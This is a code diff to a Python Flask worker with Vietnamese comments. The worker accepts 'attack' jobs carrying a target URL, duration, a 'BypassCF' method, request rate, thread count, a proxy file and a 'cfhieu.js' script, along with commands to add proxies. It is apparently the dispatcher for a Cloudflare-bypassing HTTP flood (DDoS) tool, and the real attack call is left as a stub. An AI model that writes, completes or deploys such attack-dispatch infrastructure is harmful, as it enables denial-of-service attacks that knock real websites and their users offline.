@@ -7,13 +7,25 @@ from flask import Flask, request, jsonify
 
 def handle_attack(target: str, duration: int, method: str = "BypassCF", **kwargs) -> Dict[str, Any]:
     # TODO: gọi hàm tấn công thật của bạn ở đây
+    # Lấy các tham số bổ sung từ kwargs
+    script = kwargs.get("script", "cfhieu.js")
+    rate = kwargs.get("rate", "8")
+    thread = kwargs.get("thread", "4")
+    proxyfile = kwargs.get("proxyfile", "proxy.txt")
+    
+    # Logic giả lập (thay bằng code thật để chạy script)
+    print(f"Running attack: target={target}, duration={duration}, method={method}, script={script}, rate={rate}, thread={thread}, proxyfile={proxyfile}")
     return {
         "status": "running",
         "task_id": f"ga-{int(time.time())}",
         "target": target,
         "duration": duration,
         "method": method,
-        "worker": os.getenv("WORKER_ID", "1")
+        "worker": os.getenv("WORKER_ID", "1"),
+        "script": script,
+        "rate": rate,
+        "thread": thread,
+        "proxyfile": proxyfile
     }
 
 def handle_add_proxy(proxy: str) -> Dict[str, Any]:
@@ -31,7 +43,7 @@ def handle_stop(task_id: str) -> Dict[str, Any]:
 def process_task(payload: Dict[str, Any]) -> Dict[str, Any]:
     """
     payload mẫu:
-      {"cmd":"attack","args":{"target":"https://...","duration":120,"method":"BypassCF"}}
+      {"cmd":"attack","args":{"target":"https://...","duration":120,"method":"BypassCF", "script":"cfhieu.js", "rate":"16", "thread":"3", "proxyfile":"proxy.txt"}}
       {"cmd":"addproxy","args":{"proxy":"http://1.2.3.4:8080"}}
     """
     cmd  = payload.get("cmd")
@@ -39,7 +51,7 @@ def process_task(payload: Dict[str, Any]) -> Dict[str, Any]:
 
     if cmd == "attack":
         target   = args.get("target")
-        duration = int(args.get("duration", 60))
+        duration = int(args.get("duration", 60))  # Chuyển time thành duration
         method   = args.get("method", "BypassCF")
         return handle_attack(target, duration, method, **args)
 
@@ -61,7 +73,6 @@ app = Flask(__name__)
 @app.post("/execute")
 def http_execute():
     data = request.get_json(force=True) or {}
-    # Nếu trước đây body không có "cmd", bạn có thể map sang cmd mặc định tại đây.
     res = process_task(data)
     return jsonify(res), 200
 
